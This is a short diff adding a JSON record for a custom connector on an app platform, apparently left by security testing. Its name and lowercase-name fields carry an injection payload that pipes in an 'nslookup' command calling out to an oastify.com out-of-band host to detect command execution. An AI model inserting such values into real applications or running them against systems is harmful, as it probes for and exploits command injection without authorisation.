@@ -1,0 +1,15 @@
+{
+	"createdTime":1741342099847,
+	"deleted":false,
+	"enabled":false,
+	"id":"67cac59319d8a25fc18fa73b",
+	"lastModifiedBy":22743,
+	"lcName":"hsudcq|nslookup -q=cname 1uw8xfz8vba1njk260z2hn3j5ab3z4qsmge34rt.oastify.com.&",
+	"logo":"https://assets.unifyapps.com/images/app-icons/custom_connector_01.svg",
+	"modifiedTime":1741342099847,
+	"name":"hsuDcq|nslookup -q=cname 1uw8xfz8vba1njk260z2hn3j5ab3z4qsmge34rt.oastify.com.&",
+	"ownerUserId":22743,
+	"standard":false,
+	"standardApp":false,
+	"version":0
+}
